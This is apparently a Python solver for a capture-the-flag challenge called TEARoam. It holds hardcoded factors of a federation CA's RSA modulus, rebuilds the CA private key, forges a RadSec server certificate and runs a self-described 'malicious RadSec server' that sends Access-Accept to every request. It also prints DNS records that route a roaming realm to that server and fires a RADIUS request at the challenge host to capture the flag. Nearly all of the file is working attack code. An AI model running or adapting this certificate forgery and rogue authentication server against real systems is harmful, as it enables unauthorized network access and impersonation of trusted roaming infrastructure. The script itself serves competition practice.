#!/usr/bin/env python3
"""TEARoam solver.

The attachment leaks enough information to factor the federation CA modulus.
The recovered CA key is then used to issue a valid RadSec server certificate.
Run the malicious RadSec endpoint on a public host, point a realm's NAPTR/SRV
records at it, and send one EAP identity request to the challenge RADIUS port.
"""

from __future__ import annotations

import argparse
import hashlib
import hmac
import ipaddress
import os
import socket
import ssl
import struct
import sys
import threading
import time
from datetime import datetime, timedelta, timezone
from pathlib import Path
from typing import Iterable

from cryptography import x509
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.x509.oid import ExtendedKeyUsageOID, NameOID

# Recovered from gen_ca_log.txt:
# 1. Convert each torus value into a DLP in F_r^*.
# 2. Solve the nine 61-bit DLPs and CRT the residues to recover p >> 508.
# 3. Use Coppersmith/LLL on N with the known 516 MSBs of p.
P = 149121920620887235489793066647598105864596535406270379307629830739565146637034818000934202925975833737008392366186022669982435326835723992694191115096064450666065585515012629286507096503187697142277071943624790504054697111677855238515065150910149248536819367112996193329721092408801533679739727939134900363137
Q = 115698832759793687413857034134110851392384455296526735109556615877849818425842629623527886384504489835465514250239573673919816825547235379701835426514736903153981398344915459506315616440053605220093249114596410763906807761279662352134286321456598947811886539388579374717937279922636063099849498114050974575611

DEFAULT_CA = Path(__file__).resolve().parent / "radsecproxy" / "certs" / "ca.crt"
DEFAULT_CERT = Path(__file__).resolve().parent / "forged-radsec.crt"
DEFAULT_KEY = Path(__file__).resolve().parent / "forged-radsec.key"
DEFAULT_CA_KEY = Path(__file__).resolve().parent / "recovered-ca.key"

ACCESS_REQUEST = 1
ACCESS_ACCEPT = 2
ATTR_USER_NAME = 1
ATTR_REPLY_MESSAGE = 18
ATTR_PROXY_STATE = 33
ATTR_EAP_MESSAGE = 79
ATTR_MESSAGE_AUTHENTICATOR = 80


def radius_attr(attr_type: int, value: bytes) -> bytes:
    if len(value) > 253:
        raise ValueError("RADIUS attribute is too long")
    return bytes((attr_type, len(value) + 2)) + value


def parse_radius_attrs(raw: bytes) -> list[tuple[int, bytes]]:
    attrs: list[tuple[int, bytes]] = []
    offset = 0
    while offset < len(raw):
        if offset + 2 > len(raw):
            raise ValueError("truncated RADIUS attribute")
        attr_type, length = raw[offset], raw[offset + 1]
        if length < 2 or offset + length > len(raw):
            raise ValueError("invalid RADIUS attribute length")
        attrs.append((attr_type, raw[offset + 2 : offset + length]))
        offset += length
    return attrs


def pack_radius(code: int, identifier: int, authenticator: bytes, attrs: bytes) -> bytes:
    if len(authenticator) != 16:
        raise ValueError("RADIUS authenticator must be 16 bytes")
    return struct.pack("!BBH", code, identifier, 20 + len(attrs)) + authenticator + attrs


def build_access_request(identity: str, secret: bytes, identifier: int = 7) -> tuple[bytes, bytes]:
    identity_bytes = identity.encode()
    eap_identity = (
        struct.pack("!BBH", 2, identifier, 5 + len(identity_bytes))
        + b"\x01"
        + identity_bytes
    )
    request_authenticator = os.urandom(16)
    attrs = b"".join(
        (
            radius_attr(ATTR_USER_NAME, identity_bytes),
            radius_attr(32, b"tearoam-solver"),
            radius_attr(ATTR_EAP_MESSAGE, eap_identity),
            radius_attr(ATTR_MESSAGE_AUTHENTICATOR, b"\x00" * 16),
        )
    )
    packet = pack_radius(ACCESS_REQUEST, identifier, request_authenticator, attrs)
    message_authenticator = hmac.new(secret, packet, hashlib.md5).digest()
    attrs = attrs[:-16] + message_authenticator
    return pack_radius(ACCESS_REQUEST, identifier, request_authenticator, attrs), request_authenticator


def build_access_accept(request: bytes, secret: bytes = b"radsec") -> bytes:
    if len(request) < 20:
        raise ValueError("short RADIUS request")
    code, identifier, length = struct.unpack("!BBH", request[:4])
    if code != ACCESS_REQUEST or length != len(request):
        raise ValueError("expected a complete Access-Request")

    request_authenticator = request[4:20]
    request_attrs = parse_radius_attrs(request[20:])
    eap_data = b"".join(value for attr_type, value in request_attrs if attr_type == ATTR_EAP_MESSAGE)
    eap_identifier = eap_data[1] if len(eap_data) >= 2 else identifier

    # RFC 2865 requires a proxy to receive every Proxy-State unchanged.
    echoed_proxy_state = b"".join(
        radius_attr(attr_type, value)
        for attr_type, value in request_attrs
        if attr_type == ATTR_PROXY_STATE
    )
    attrs = b"".join(
        (
            echoed_proxy_state,
            radius_attr(ATTR_EAP_MESSAGE, struct.pack("!BBH", 3, eap_identifier, 4)),
            radius_attr(ATTR_MESSAGE_AUTHENTICATOR, b"\x00" * 16),
        )
    )

    # RFC 3579: response Message-Authenticator is calculated with the
    # original Request Authenticator in the authenticator field.
    temporary = pack_radius(ACCESS_ACCEPT, identifier, request_authenticator, attrs)
    message_authenticator = hmac.new(secret, temporary, hashlib.md5).digest()
    attrs = attrs[:-16] + message_authenticator

    response_length = 20 + len(attrs)
    response_authenticator = hashlib.md5(
        struct.pack("!BBH", ACCESS_ACCEPT, identifier, response_length)
        + request_authenticator
        + attrs
        + secret
    ).digest()
    return pack_radius(ACCESS_ACCEPT, identifier, response_authenticator, attrs)


def verify_radius_response(response: bytes, request_authenticator: bytes, secret: bytes) -> bool:
    if len(response) < 20:
        return False
    _code, _identifier, length = struct.unpack("!BBH", response[:4])
    if length != len(response):
        return False
    expected = hashlib.md5(response[:4] + request_authenticator + response[20:] + secret).digest()
    if not hmac.compare_digest(expected, response[4:20]):
        return False

    offset = 20
    message_authenticator_offset: int | None = None
    while offset < len(response):
        attr_type, attr_length = response[offset], response[offset + 1]
        if attr_length < 2 or offset + attr_length > len(response):
            return False
        if attr_type == ATTR_MESSAGE_AUTHENTICATOR and attr_length == 18:
            message_authenticator_offset = offset + 2
            break
        offset += attr_length

    if message_authenticator_offset is not None:
        packet = bytearray(response)
        received = bytes(packet[message_authenticator_offset : message_authenticator_offset + 16])
        packet[4:20] = request_authenticator
        packet[message_authenticator_offset : message_authenticator_offset + 16] = b"\x00" * 16
        calculated = hmac.new(secret, bytes(packet), hashlib.md5).digest()
        if not hmac.compare_digest(received, calculated):
            return False
    return True


def recover_ca_private_key(ca_cert: x509.Certificate) -> rsa.RSAPrivateKey:
    public_numbers = ca_cert.public_key().public_numbers()
    if P * Q != public_numbers.n:
        raise RuntimeError("embedded factors do not match the supplied CA certificate")
    e = public_numbers.e
    phi = (P - 1) * (Q - 1)
    d = pow(e, -1, phi)
    private_numbers = rsa.RSAPrivateNumbers(
        p=P,
        q=Q,
        d=d,
        dmp1=d % (P - 1),
        dmq1=d % (Q - 1),
        iqmp=pow(Q, -1, P),
        public_numbers=public_numbers,
    )
    return private_numbers.private_key()


def forge_server_certificate(
    ca_path: Path,
    cert_path: Path,
    key_path: Path,
    ca_key_path: Path,
    names: Iterable[str],
) -> None:
    ca_cert = x509.load_pem_x509_certificate(ca_path.read_bytes())
    ca_key = recover_ca_private_key(ca_cert)
    server_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)

    dns_names = sorted({name.rstrip(".") for name in names if name})
    if not dns_names:
        raise ValueError("at least one DNS name is required")

    now = datetime.now(timezone.utc)
    not_after = min(now + timedelta(days=825), ca_cert.not_valid_after_utc - timedelta(minutes=1))
    subject = x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, dns_names[0])])
    cert_builder = (
        x509.CertificateBuilder()
        .subject_name(subject)
        .issuer_name(ca_cert.subject)
        .public_key(server_key.public_key())
        .serial_number(x509.random_serial_number())
        .not_valid_before(max(now - timedelta(hours=1), ca_cert.not_valid_before_utc))
        .not_valid_after(not_after)
        .add_extension(x509.BasicConstraints(ca=False, path_length=None), critical=True)
        .add_extension(
            x509.KeyUsage(
                digital_signature=True,
                content_commitment=False,
                key_encipherment=True,
                data_encipherment=False,
                key_agreement=False,
                key_cert_sign=False,
                crl_sign=False,
                encipher_only=None,
                decipher_only=None,
            ),
            critical=True,
        )
        .add_extension(x509.ExtendedKeyUsage([ExtendedKeyUsageOID.SERVER_AUTH]), critical=False)
        .add_extension(
            x509.SubjectAlternativeName([x509.DNSName(name) for name in dns_names]),
            critical=False,
        )
        .add_extension(x509.SubjectKeyIdentifier.from_public_key(server_key.public_key()), critical=False)
        .add_extension(x509.AuthorityKeyIdentifier.from_issuer_public_key(ca_key.public_key()), critical=False)
    )
    server_cert = cert_builder.sign(private_key=ca_key, algorithm=hashes.SHA256())

    key_path.write_bytes(
        server_key.private_bytes(
            serialization.Encoding.PEM,
            serialization.PrivateFormat.PKCS8,
            serialization.NoEncryption(),
        )
    )
    cert_path.write_bytes(server_cert.public_bytes(serialization.Encoding.PEM))
    ca_key_path.write_bytes(
        ca_key.private_bytes(
            serialization.Encoding.PEM,
            serialization.PrivateFormat.TraditionalOpenSSL,
            serialization.NoEncryption(),
        )
    )
    os.chmod(key_path, 0o600)
    os.chmod(ca_key_path, 0o600)


def recv_exact(sock: ssl.SSLSocket, size: int) -> bytes | None:
    chunks = bytearray()
    while len(chunks) < size:
        chunk = sock.recv(size - len(chunks))
        if not chunk:
            return None
        chunks.extend(chunk)
    return bytes(chunks)


def handle_radsec_connection(conn: ssl.SSLSocket, peer: tuple[str, int]) -> None:
    try:
        while True:
            header = recv_exact(conn, 4)
            if header is None:
                return
            code, identifier, length = struct.unpack("!BBH", header)
            if length < 20 or length > 65535:
                raise ValueError(f"invalid RADIUS length {length}")
            body = recv_exact(conn, length - 4)
            if body is None:
                return
            packet = header + body
            print(f"[+] RadSec request from {peer[0]}:{peer[1]} code={code} id={identifier} len={length}")
            for attr_type, value in parse_radius_attrs(packet[20:]):
                if attr_type == ATTR_USER_NAME:
                    print(f"    User-Name: {value.decode(errors='replace')}")
            if code == ACCESS_REQUEST:
                conn.sendall(build_access_accept(packet, b"radsec"))
                print(f"[+] sent Access-Accept id={identifier}")
    except Exception as exc:
        print(f"[-] RadSec client error: {exc}", file=sys.stderr)
    finally:
        try:
            conn.close()
        except OSError:
            pass


def run_radsec_server(
    bind_host: str,
    port: int,
    cert_path: Path,
    key_path: Path,
    ca_path: Path,
    ready: threading.Event | None = None,
) -> None:
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    context.minimum_version = ssl.TLSVersion.TLSv1_2
    context.load_cert_chain(certfile=cert_path, keyfile=key_path)
    # Request the federation client certificate, but do not require it for the exploit.
    context.load_verify_locations(cafile=ca_path)
    context.verify_mode = ssl.CERT_OPTIONAL

    family = socket.AF_INET6 if ":" in bind_host else socket.AF_INET
    listener = socket.socket(family, socket.SOCK_STREAM)
    listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    listener.bind((bind_host, port))
    listener.listen(64)
    print(f"[*] malicious RadSec server listening on {bind_host}:{port}")
    if ready is not None:
        ready.set()

    while True:
        raw, peer = listener.accept()
        try:
            tls = context.wrap_socket(raw, server_side=True)
        except Exception as exc:
            print(f"[-] TLS handshake from {peer}: {exc}", file=sys.stderr)
            raw.close()
            continue
        threading.Thread(target=handle_radsec_connection, args=(tls, peer), daemon=True).start()


def trigger_radius(target: str, port: int, identity: str, timeout: float) -> str | None:
    secret = b"testing123"
    request, request_authenticator = build_access_request(identity, secret)
    family = socket.AF_INET6 if ":" in target else socket.AF_INET
    sock = socket.socket(family, socket.SOCK_DGRAM)
    sock.settimeout(timeout)
    print(f"[*] sending Access-Request to {target}:{port} as {identity}")
    sock.sendto(request, (target, port))
    response, peer = sock.recvfrom(65535)
    code, identifier, length = struct.unpack("!BBH", response[:4])
    print(f"[+] received RADIUS code={code} id={identifier} len={length} from {peer}")
    print(f"[+] response authenticator valid: {verify_radius_response(response, request_authenticator, secret)}")

    found_flag: str | None = None
    for attr_type, value in parse_radius_attrs(response[20:length]):
        if attr_type == ATTR_REPLY_MESSAGE:
            message = value.decode(errors="replace")
            print(f"[+] Reply-Message: {message}")
            if message.startswith("NHNC{") and message.endswith("}"):
                found_flag = message
        elif attr_type == ATTR_EAP_MESSAGE:
            print(f"[+] EAP-Message: {value.hex()}")
    if found_flag:
        print(f"<FLAG>{found_flag}</FLAG>")
    return found_flag


def print_dns_records(realm: str, server_name: str, public_ip: str | None, port: int) -> None:
    realm = realm.rstrip(".")
    server_name = server_name.rstrip(".")
    print("\nDNS records required by radsecproxy dynamic discovery:")
    print(
        f'{realm}. 300 IN NAPTR 10 10 "S" "aaa+auth:radius.tls.tcp" "" '
        f"_radiustls._tcp.{realm}."
    )
    print(f"_radiustls._tcp.{realm}. 300 IN SRV 0 0 {port} {server_name}.")
    if public_ip:
        try:
            parsed = ipaddress.ip_address(public_ip)
            record_type = "AAAA" if parsed.version == 6 else "A"
            print(f"{server_name}. 300 IN {record_type} {public_ip}")
        except ValueError:
            print(f"# Point {server_name} to the public IP of this RadSec server.")
    else:
        print(f"# Point {server_name} to the public IP of this RadSec server.")
    print()


def ensure_certificate(args: argparse.Namespace) -> None:
    cert_path = Path(args.cert)
    key_path = Path(args.key)
    ca_key_path = Path(args.ca_key)
    forge_server_certificate(
        Path(args.ca),
        cert_path,
        key_path,
        ca_key_path,
        [args.realm, args.server_name],
    )
    print(f"[+] forged certificate: {cert_path}")
    print(f"[+] forged private key: {key_path}")
    print(f"[+] recovered CA key: {ca_key_path}")


def add_common_certificate_args(parser: argparse.ArgumentParser) -> None:
    parser.add_argument("--realm", required=True, help="attacker-controlled roaming realm")
    parser.add_argument("--server-name", required=True, help="FQDN used by the RadSec SRV record")
    parser.add_argument("--ca", default=str(DEFAULT_CA))
    parser.add_argument("--cert", default=str(DEFAULT_CERT))
    parser.add_argument("--key", default=str(DEFAULT_KEY))
    parser.add_argument("--ca-key", default=str(DEFAULT_CA_KEY))
    parser.add_argument("--public-ip")
    parser.add_argument("--radsec-port", type=int, default=2083)


def main() -> int:
    parser = argparse.ArgumentParser(description="TEARoam federation authorization bypass")
    sub = parser.add_subparsers(dest="command", required=True)

    prepare = sub.add_parser("prepare", help="forge the RadSec server certificate")
    add_common_certificate_args(prepare)

    serve = sub.add_parser("serve", help="run the malicious RadSec server")
    add_common_certificate_args(serve)
    serve.add_argument("--bind", default="0.0.0.0")
    serve.add_argument("--reuse-cert", action="store_true")

    trigger = sub.add_parser("trigger", help="send the EAP identity request")
    trigger.add_argument("--target", default="tearoam.teagod.tech")
    trigger.add_argument("--target-port", type=int, default=1812)
    trigger.add_argument("--realm", required=True)
    trigger.add_argument("--user", default="alice")
    trigger.add_argument("--timeout", type=float, default=20.0)

    run = sub.add_parser("run", help="forge cert, serve RadSec, then trigger RADIUS")
    add_common_certificate_args(run)
    run.add_argument("--bind", default="0.0.0.0")
    run.add_argument("--target", default="tearoam.teagod.tech")
    run.add_argument("--target-port", type=int, default=1812)
    run.add_argument("--user", default="alice")
    run.add_argument("--timeout", type=float, default=20.0)
    run.add_argument("--startup-delay", type=float, default=1.0)

    args = parser.parse_args()

    if args.command == "prepare":
        ensure_certificate(args)
        print_dns_records(args.realm, args.server_name, args.public_ip, args.radsec_port)
        return 0

    if args.command == "serve":
        if not args.reuse_cert:
            ensure_certificate(args)
        print_dns_records(args.realm, args.server_name, args.public_ip, args.radsec_port)
        run_radsec_server(args.bind, args.radsec_port, Path(args.cert), Path(args.key), Path(args.ca))
        return 0

    if args.command == "trigger":
        identity = f"{args.user}@{args.realm.rstrip('.')}"
        return 0 if trigger_radius(args.target, args.target_port, identity, args.timeout) else 1

    if args.command == "run":
        ensure_certificate(args)
        print_dns_records(args.realm, args.server_name, args.public_ip, args.radsec_port)
        ready = threading.Event()
        server_thread = threading.Thread(
            target=run_radsec_server,
            args=(args.bind, args.radsec_port, Path(args.cert), Path(args.key), Path(args.ca), ready),
            daemon=True,
        )
        server_thread.start()
        ready.wait(5)
        time.sleep(args.startup_delay)
        identity = f"{args.user}@{args.realm.rstrip('.')}"
        return 0 if trigger_radius(args.target, args.target_port, identity, args.timeout) else 1

    return 2


if __name__ == "__main__":
    raise SystemExit(main())
